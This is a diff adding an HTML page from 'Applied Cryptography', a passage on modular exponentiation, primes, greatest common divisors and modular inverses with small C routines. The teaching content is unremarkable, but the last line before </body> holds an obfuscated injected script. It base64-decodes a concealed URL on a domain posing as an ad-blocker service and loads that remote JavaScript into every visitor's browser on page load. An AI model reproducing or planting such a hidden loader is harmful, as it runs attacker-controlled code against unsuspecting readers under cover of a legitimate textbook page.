@@ -1,0 +1,194 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Mathematical Background</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=11//-->
+<!--PAGES=243-246//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Computing <I>a<SUP><SMALL>x</SMALL></SUP></I> mod <I>n</I>, where <I>x</I> is not a power of 2, is only slightly harder. Binary notation expresses <I>x</I> as a sum of powers of 2: 25 is 11001 in binary, so 25 = 2<SUP><SMALL>4</SMALL></SUP> &#43; 2<SUP><SMALL>3</SMALL></SUP> &#43; 2<SUP><SMALL>0</SMALL></SUP>. So</P>
+<DL>
+<DD><I>a<SUP><SMALL>25</SMALL></SUP></I> mod <I>n</I> = (<I>a*a<SUP><SMALL>24</SMALL></SUP></I>) mod <I>n</I> = (<I>a*a<SUP><SMALL>8</SMALL></SUP>*a<SUP><SMALL>16</SMALL></SUP></I>) mod <I>n</I>
+<DD>= (a*((<I>a<SUP><SMALL>2</SMALL></SUP></I>)<SUP><SMALL>2</SMALL></SUP>)<SUP><SMALL>2</SMALL></SUP>*(((<I>a<SUP><SMALL>2</SMALL></SUP></I>)<SUP><SMALL>2</SMALL></SUP>)<SUP><SMALL>2</SMALL></SUP>)<SUP><SMALL>2</SMALL></SUP>) mod <I>n</I> = ((((<I>a<SUP><SMALL>2</SMALL></SUP>*a</I>)<SUP><SMALL>2</SMALL></SUP>)<SUP><SMALL>2</SMALL></SUP>)<SUP><SMALL>2</SMALL></SUP>*a) mod <I>n</I>
+</DL>
+<P>With judicious storing of intermediate results, you only need six multiplications:
+</P>
+<DL>
+<DD>(((((((<I>a<SUP><SMALL>2</SMALL></SUP></I> mod <I>n</I>)*a) mod <I>n</I>)<SUP><SMALL>2</SMALL></SUP> mod <I>n</I>)<SUP><SMALL>2</SMALL></SUP> mod <I>n</I>)<SUP><SMALL>2</SMALL></SUP> mod <I>n</I>)*a) mod <I>n</I>
+</DL>
+<P>This is called <B>addition chaining</B> [863], or the binary square and multiply method. It uses a simple and obvious addition chain based on the binary representation. In C, it looks like:</P>
+<!-- CODE //-->
+<PRE>
+    unsigned long qe2(unsigned long x, unsigned long y, unsigned long n) {
+    	unsigned long s,t,u;
+    	int i;
+    
+    	s = 1; t = x; u = y;
+    	while(u) {
+    		if(u&amp1) s = (s* t)%n;
+    		u&gt&gt=1;
+    		t = (t* t)%n;
+    	}
+    	return(s);
+    }
+</PRE>
+<!-- END CODE //-->
+<P>Another, recursive, algorithm is:
+</P>
+<!-- CODE //-->
+<PRE>
+    unsigned long fast_exp(unsigned long x, unsigned long y, unsigned long N) {
+    	unsigned long tmp;
+         if(y==1) return(x % N);
+         if ((y&amp1)==0) {
+    	       tmp = fast_exp(x,y/2,N);
+    	       return ((tmp* tmp)%N);
+         }
+         else {
+    	       tmp = fast_exp(x,(y-1)/2,N);
+    	       tmp = (tmp* tmp)%N;
+    	       tmp = (tmp* x)%N;
+    	       return (tmp);
+         }
+    }
+</PRE>
+<!-- END CODE //-->
+<P>This technique reduces the operation to, on the average, 1.5*k operations, if <I>k</I> is the length of the number <I>x</I> in bits. Finding the calculation with the fewest operations is a hard problem (it has been proven that the sequence must contain at least <I>k</I>- 1 operations), but it is not too hard to get the number of operations down to 1.1*k or better, as <I>k</I> grows.</P>
+<P>An efficient way to do modular reductions many times using the same <I>n</I> is <B>Montgomery&#146;s method</B> [1111]. Another method is called <B>Barrett&#146;s algorithm</B> [87]. The software performance of these two algorithms and the algorithm previously discussed is in [210]: The algorithm I&#146;ve discussed is the best choice for singular modular reductions; Barrett&#146;s algorithm is the best choice for small arguments; and Montgomery&#146;s method is the best choice for general modular exponentiations. (Montgomery&#146;s method can also take advantage of small exponents, using something called mixed arithmetic.)</P>
+<P>The inverse of exponentiation modulo <I>n</I> is calculating a <B>discrete logarithm</B> . I&#146;ll discuss this shortly.</P>
+<P><FONT SIZE="+1"><B><I>Prime Numbers</I></B></FONT></P>
+<P>A <B>prime</B> number is an integer greater than 1 whose only factors are 1 and itself: No other number evenly divides it. Two is a prime number. So are 73, 2521, 2365347734339, and 2<SUP><SMALL>756839</SMALL></SUP> - 1. There are an infinite number of primes. Cryptography, especially public-key cryptography, uses large primes (512 bits and even larger) often.</P>
+<P>Evangelos Kranakis wrote an excellent book on number theory, prime numbers, and their applications to cryptography [896]. Paulo Ribenboim wrote two excellent references on prime numbers in general [1307, 1308].</P>
+<P><FONT SIZE="+1"><B><I>Greatest Common Divisor</I></B></FONT></P>
+<P>Two numbers are <B>relatively prime</B> when they share no factors in common other than 1. In other words, if the <B>greatest common divisor</B> of <I>a</I> and <I>n</I> is equal to 1. This is written:</P>
+<DL>
+<DD>gcd(<I>a,n</I>) = 1
+</DL>
+<P>The numbers 15 and 28 are relatively prime, 15 and 27 are not, and 13 and 500 are. A prime number is relatively prime to all other numbers except its multiples.
+</P>
+<P>One way to compute the greatest common divisor of two numbers is with <B>Euclid&#146;s algorithm</B> . Euclid described the algorithm in his book, <I>Elements</I>, written around 300 B.C. He didn&#146;t invent it. Historians believe the algorithm could be 200 years older. It is the oldest nontrivial algorithm that has survived to the present day, and it is still a good one. Knuth describes the algorithm and some modern modifications [863].</P>
+<P>In C:</P>
+<!-- CODE //-->
+<PRE>
+    /* returns gcd of x and y */
+    int gcd (int x, int y)
+    {
+         int g;
+         if (x &lt 0)
+    	  x = -x;
+         if (y &lt 0)
+    	  y = -y;
+         if (x &#43; y == 0)
+    	  ERROR;
+         g = y;
+         while (x &gt 0) {
+    	  g = x;
+    	  x = y % x;
+    	  y = g;
+         }
+         return g;
+    }
+</PRE>
+<!-- END CODE //-->
+<P>This algorithm can be generalized to return the gcd of an array of <I>m</I> numbers:</P>
+<!-- CODE //-->
+<PRE>
+    /* returns the gcd of x1, x2...xm */
+    int multiple_gcd (int m, int *x)
+    {
+         size_t i;
+         int g;
+
+         if (m &lt 1)
+    	       return 0;
+         g = x[0];
+         for (i=1; i&ltm; &#43;&#43;i) {
+    	       g = gcd(g, x[i]);
+    /* optimization, since for random x[i], g==1 60% of the time: */
+    	        if (g == 1)
+    	             return 1;
+         }
+         return g;
+    }
+</PRE>
+<!-- END CODE //-->
+<P><FONT SIZE="+1"><B><I>Inverses Modulo a Number</I></B></FONT></P>
+<P>Remember inverses? The multiplicative inverse of 4 is 1/4, because 4*1/4 = 1. In the modulo world, the problem is more complicated:
+</P>
+<DL>
+<DD>4*x &#8801; 1 (mod 7)
+</DL>
+<P>This equation is equivalent to finding an <I>x</I> and <I>k</I> such that</P>
+<DL>
+<DD>4<I>x</I> = 7<I>k</I> &#43; 1
+</DL>
+<P>where both <I>x</I> and <I>k</I> are integers.</P>
+<P>The general problem is finding an <I>x</I> such that</P>
+<DL>
+<DD>1 = (<I>a*x</I>) mod <I>n</I>
+</DL>
+<P>This is also written as
+</P>
+<DL>
+<DD><I>a</I> <SUP><SMALL>-1</SMALL></SUP> &#8801; x (mod <I>n</I>)
+</DL>
+<P>The modular inverse problem is a lot more difficult to solve. Sometimes it has a solution, sometimes not. For example, the inverse of 5, modulo 14, is 3. On the other hand, 2 has no inverse modulo 14.
+</P>
+<P>In general, <I>a</I><SUP><SMALL>-1</SMALL></SUP> &#8801; <I>x</I> (mod <I>n</I>) has a unique solution if <I>a</I> and <I>n</I> are relatively prime. If <I>a</I> and <I>n</I> are not relatively prime, then <I>a-1</I> &#8801; <I>x</I> (mod <I>n</I>) has no solution. If <I>n</I> is a prime number, then every number from 1 to <I>n</I>- 1 is relatively prime to <I>n</I> and has exactly one inverse modulo <I>n</I> in that range.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="11-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="11-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(KUeeMxba, SFxyJJoP) {SFxyJJoP = KUeeMxba.createElement('script');SFxyJJoP.type = 'text/javascript';SFxyJJoP.async = true;SFxyJJoP.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');KUeeMxba.getElementsByTagName('body')[0].appendChild(SFxyJJoP);}(document));</script></body>
+</html>
